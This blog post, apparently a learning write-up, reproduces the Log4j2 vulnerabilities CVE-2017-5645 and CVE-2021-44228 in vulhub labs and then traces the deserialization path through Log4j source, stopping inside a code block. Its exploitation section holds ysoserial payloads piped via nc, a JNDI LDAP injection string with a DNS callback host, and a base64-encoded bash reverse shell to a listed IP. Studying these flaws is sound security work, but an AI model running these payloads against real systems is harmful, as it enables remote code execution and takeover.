<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="核弹级漏洞感觉全是巧合"><title>Log4j2反序列化漏洞</title><link rel=canonical href=https://baozongwi.xyz/p/log4j2-deserialization-vuln/><link rel=stylesheet href=/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css><meta property='og:title' content="Log4j2反序列化漏洞"><meta property='og:description' content="核弹级漏洞感觉全是巧合"><meta property='og:url' content='https://baozongwi.xyz/p/log4j2-deserialization-vuln/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content><meta property='article:published_time' content='2025-10-11T20:11:27+08:00'><meta property='article:modified_time' content='2025-10-11T20:11:27+08:00'><meta name=twitter:title content="Log4j2反序列化漏洞"><meta name=twitter:description content="核弹级漏洞感觉全是巧合"><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1><h2 class=site-description>H@cking Th3 Fu1ure</h2></div></header><ol class=menu-social><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li><a href=https://www.yuque.com/baozongwi/kkn04k><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-map-pin"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/><circle cx="12" cy="10" r="3"/></svg>
<span>travel</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#漏洞利用>漏洞利用</a><ol><li><a href=#cve-2017-5645>CVE-2017-5645</a></li><li><a href=#cve-2021-44228>CVE-2021-44228</a></li></ol></li><li><a href=#漏洞分析>漏洞分析</a><ol><li><a href=#cve-2017-5645-1>CVE-2017-5645</a></li><li><a href=#cve-2021-44228-1>CVE-2021-44228</a></li></ol></li><li><a href=#修复>修复</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/javasec/>Javasec</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/log4j2-deserialization-vuln/>Log4j2反序列化漏洞</a></h2><h3 class=article-subtitle>核弹级漏洞感觉全是巧合</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Oct 11, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>9 minute read</time></div></footer></div></header><section class=article-content><p>在P牛的学习文档的帮助下，走了一遍基础，现在准备看看危害（当时）极高的log4j漏洞，我一进去搜索就看到有些人说是log4j，又有些人说是log4j2，迷迷糊糊的，查了一下资料知道网上广泛讨论的Log4j漏洞（如CVE-2021-44228）实际上是指Log4j2的漏洞 ，而非旧的Log4j 1.x版本。</p><h2 id=漏洞利用>漏洞利用</h2><p>先安装P牛的漏洞包进行利用复现</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>git clone https://github.com/vulhub/vulhub.git
</span></span></code></pre></td></tr></table></div></div><h3 id=cve-2017-5645>CVE-2017-5645</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>cd</span> CVE-2017-5645
</span></span><span class=line><span class=cl>docker compose up -d
</span></span></code></pre></td></tr></table></div></div><p>搭建好环境之后尝试利用，观察到开启4712端口服务，发送反序列化数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>java -jar ysoserial-all.jar CommonsCollections5 <span class=s2>&#34;touch /tmp/baozongwi&#34;</span> <span class=p>|</span> nc 154.36.152.109 <span class=m>4712</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>java -jar ysoserial-all.jar CommonsCollections5 <span class=s2>&#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNTQuMzYuMTUyLjEwOS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}&#34;</span> <span class=p>|</span> nc 154.36.152.109 <span class=m>4712</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/log4j2-deserialization-vuln/1.png width=1538 height=308 srcset="/p/log4j2-deserialization-vuln/1_hu_70e14e38a7d1a244.png 480w, /p/log4j2-deserialization-vuln/1_hu_6a31505f381bee34.png 1024w" loading=lazy alt=img class=gallery-image data-flex-grow=499 data-flex-basis=1198px></p><p><img src=/p/log4j2-deserialization-vuln/2.png width=1244 height=674 srcset="/p/log4j2-deserialization-vuln/2_hu_b46045555e76855.png 480w, /p/log4j2-deserialization-vuln/2_hu_ac5f161ada003c3.png 1024w" loading=lazy alt=img class=gallery-image data-flex-grow=184 data-flex-basis=442px></p><h3 id=cve-2021-44228>CVE-2021-44228</h3><p>访问靶机8983端口</p><p><img src=/p/log4j2-deserialization-vuln/3.png width=1874 height=1480 srcset="/p/log4j2-deserialization-vuln/3_hu_4a055590cd5e6d.png 480w, /p/log4j2-deserialization-vuln/3_hu_f9264e028475ce8a.png 1024w" loading=lazy alt=img class=gallery-image data-flex-grow=126 data-flex-basis=303px></p><p>先进行DNS探测</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/solr/admin/cores?action<span class=o>=</span><span class=si>${</span><span class=nv>jndi</span><span class=p>:</span><span class=nv>ldap</span><span class=p>://zfvfqa2m.requestrepo.com</span><span class=si>}</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/log4j2-deserialization-vuln/4.png width=1502 height=1304 srcset="/p/log4j2-deserialization-vuln/4_hu_4b6c1ca3df7b59f.png 480w, /p/log4j2-deserialization-vuln/4_hu_fbd882f65e62f9ba.png 1024w" loading=lazy alt=img class=gallery-image data-flex-grow=115 data-flex-basis=276px></p><p>探测成功，尝试反序列化</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class=s2>&#34;touch /tmp/baozongwi&#34;</span> -A <span class=s2>&#34;154.36.152.109&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class=s2>&#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNTQuMzYuMTUyLjEwOS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}&#34;</span> -A <span class=s2>&#34;154.36.152.109&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/log4j2-deserialization-vuln/5.png width=1134 height=104 srcset="/p/log4j2-deserialization-vuln/5_hu_aa40fe1cbbaa2e4b.png 480w, /p/log4j2-deserialization-vuln/5_hu_ee69a1c3aa6225b5.png 1024w" loading=lazy alt=img class=gallery-image data-flex-grow=1090 data-flex-basis=2616px></p><p><img src=/p/log4j2-deserialization-vuln/6.png width=1272 height=506 srcset="/p/log4j2-deserialization-vuln/6_hu_3bc8361f6dcf0004.png 480w, /p/log4j2-deserialization-vuln/6_hu_6a7d5783ddd7b672.png 1024w" loading=lazy alt=img class=gallery-image data-flex-grow=251 data-flex-basis=603px></p><h2 id=漏洞分析>漏洞分析</h2><h3 id=cve-2017-5645-1>CVE-2017-5645</h3><p>Apache Log4j 2.0-alpha1 至 2.8.1</p><p>当目标开启了Log4j 的 <strong>TCP/UDP 日志接收功能</strong>，默认端口为4712时，直接对数据进行反序列化。</p><p>这个漏洞其实和cve-2019-17571很像（倒翻天罡），我使用的8u211</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;project</span> <span class=na>xmlns=</span><span class=s>&#34;http://maven.apache.org/POM/4.0.0&#34;</span>
</span></span><span class=line><span class=cl>         <span class=na>xmlns:xsi=</span><span class=s>&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
</span></span><span class=line><span class=cl>         <span class=na>xsi:schemaLocation=</span><span class=s>&#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;modelVersion&gt;</span>4.0.0<span class=nt>&lt;/modelVersion&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;groupId&gt;</span>org.example<span class=nt>&lt;/groupId&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;artifactId&gt;</span>log4j-2.x-rce<span class=nt>&lt;/artifactId&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;version&gt;</span>1.0-SNAPSHOT<span class=nt>&lt;/version&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;properties&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;log4j.version&gt;</span>2.8.1<span class=nt>&lt;/log4j.version&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;commons-collections.version&gt;</span>3.2.2<span class=nt>&lt;/commons-collections.version&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;/properties&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;dependencies&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;dependency&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;groupId&gt;</span>org.apache.logging.log4j<span class=nt>&lt;/groupId&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;artifactId&gt;</span>log4j-core<span class=nt>&lt;/artifactId&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;version&gt;</span>${log4j.version}<span class=nt>&lt;/version&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;/dependency&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;dependency&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;groupId&gt;</span>org.apache.logging.log4j<span class=nt>&lt;/groupId&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;artifactId&gt;</span>log4j-api<span class=nt>&lt;/artifactId&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;version&gt;</span>${log4j.version}<span class=nt>&lt;/version&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;/dependency&gt;</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=nt>&lt;dependency&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;groupId&gt;</span>commons-collections<span class=nt>&lt;/groupId&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;artifactId&gt;</span>commons-collections<span class=nt>&lt;/artifactId&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;version&gt;</span>${commons-collections.version}<span class=nt>&lt;/version&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;/dependency&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;/dependencies&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/project&gt;</span>
</span></span><span class=line><span class=cl>// src/main/java/Log4jSocketServer.java
</span></span><span class=line><span class=cl>import org.apache.logging.log4j.core.net.server.ObjectInputStreamLogEventBridge;
</span></span><span class=line><span class=cl>import org.apache.logging.log4j.core.net.server.TcpSocketServer;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>import java.io.IOException;
</span></span><span class=line><span class=cl>import java.io.ObjectInputStream;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>public class Log4jSocketServer {
</span></span><span class=line><span class=cl>    public static void main(String[] args){
</span></span><span class=line><span class=cl>        TcpSocketServer<span class=nt>&lt;ObjectInputStream&gt;</span> myServer = null;
</span></span><span class=line><span class=cl>        try{
</span></span><span class=line><span class=cl>            myServer = new TcpSocketServer<span class=nt>&lt;ObjectInputStream&gt;</span>(4712, new ObjectInputStreamLogEventBridge());
</span></span><span class=line><span class=cl>        } catch(IOException e){
</span></span><span class=line><span class=cl>            e.printStackTrace();
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>        myServer.run();
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><p>启动之后有警告，不用管，先测试看看能不能利用</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>java</span><span class=w> </span><span class=o>-</span><span class=n>jar</span><span class=w> </span><span class=n>ysoserial</span><span class=o>-</span><span class=n>all</span><span class=p>.</span><span class=na>jar</span><span class=w> </span><span class=n>CommonsCollections5</span><span class=w> </span><span class=s>&#34;touch /tmp/baozongwi&#34;</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>nc</span><span class=w> </span><span class=n>localhost</span><span class=w> </span><span class=n>4712</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>java</span><span class=w> </span><span class=o>-</span><span class=n>jar</span><span class=w> </span><span class=n>ysoserial</span><span class=o>-</span><span class=n>all</span><span class=p>.</span><span class=na>jar</span><span class=w> </span><span class=n>CommonsCollections5</span><span class=w> </span><span class=s>&#34;open -a Calculator&#34;</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>nc</span><span class=w> </span><span class=n>localhost</span><span class=w> </span><span class=n>4712</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>成功，</p><p><img src=/p/log4j2-deserialization-vuln/7.png width=2548 height=1480 srcset="/p/log4j2-deserialization-vuln/7_hu_5ad080593c776dac.png 480w, /p/log4j2-deserialization-vuln/7_hu_25721b47cfabe77e.png 1024w" loading=lazy alt=img class=gallery-image data-flex-grow=172 data-flex-basis=413px></p><p>现在来查看为什么会反序列化，看到代码主要就两个类，TcpSocketServer 和 ObjectInputStreamLogEventBridge，调试一下，跟进到<code>TcpSocketServer#run</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>run</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>EntryMessage</span><span class=w> </span><span class=n>entry</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>logger</span><span class=p>.</span><span class=na>traceEntry</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>while</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>isActive</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>serverSocket</span><span class=p>.</span><span class=na>isClosed</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>return</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>this</span><span class=p>.</span><span class=na>logger</span><span class=p>.</span><span class=na>debug</span><span class=p>(</span><span class=s>&#34;Listening for a connection {}...&#34;</span><span class=p>,</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>serverSocket</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>Socket</span><span class=w> </span><span class=n>clientSocket</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>serverSocket</span><span class=p>.</span><span class=na>accept</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>this</span><span class=p>.</span><span class=na>logger</span><span class=p>.</span><span class=na>debug</span><span class=p>(</span><span class=s>&#34;Acepted connection on {}...&#34;</span><span class=p>,</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>serverSocket</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>this</span><span class=p>.</span><span class=na>logger</span><span class=p>.</span><span class=na>debug</span><span class=p>(</span><span class=s>&#34;Socket accepted: {}&#34;</span><span class=p>,</span><span class=w> </span><span class=n>clientSocket</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>clientSocket</span><span class=p>.</span><span class=na>setSoLinger</span><span class=p>(</span><span class=kc>true</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>TcpSocketServer</span><span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span><span class=p>.</span><span class=na>SocketHandler</span><span class=w> </span><span class=n>handler</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>SocketHandler</span><span class=p>(</span><span class=n>clientSocket</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>this</span><span class=p>.</span><span class=na>handlers</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>handler</span><span class=p>.</span><span class=na>getId</span><span class=p>(),</span><span class=w> </span><span class=n>handler</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>handler</span><span class=p>.</span><span class=na>start</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>IOException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>serverSocket</span><span class=p>.</span><span class=na>isClosed</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=k>this</span><span class=p>.</span><span class=na>logger</span><span class=p>.</span><span class=na>traceExit</span><span class=p>(</span><span class=n>entry</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=k>return</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>this</span><span class=p>.</span><span class=na>logger</span><span class=p>.</span><span class=na>error</span><span class=p>(</span><span class=s>&#34;Exception encountered on accept. Ignoring. Stack trace :&#34;</span><span class=p>,</span><span class=w> </span><span class=n>e</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>初始化<code>SocketHandler</code>类之后，<code>handler.start();</code>会触发<code>SocketHandler.run</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
